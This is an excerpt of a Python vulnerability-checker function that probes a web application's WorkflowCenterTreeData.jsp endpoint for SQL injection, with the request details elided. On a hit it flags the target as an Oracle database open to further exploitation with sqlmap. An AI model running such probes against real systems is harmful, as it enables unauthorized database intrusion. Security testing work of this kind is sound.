...
def WorkflowCenterTreeData_Sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    target = urldata + 'mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333'
    ...
    try:
        ...
        if '[' in res.text:
            print(Vcolors.RED + "[!] 目标为oracle数据库, 可利用sqlmap进行进一步利用: {}".format(target) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在WorkflowCenterTreeData_Sql漏洞" + Vcolors.ENDC)
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n", e)
        logging.error("WorkflowCenterTreeData_Sql脚本出现异常")
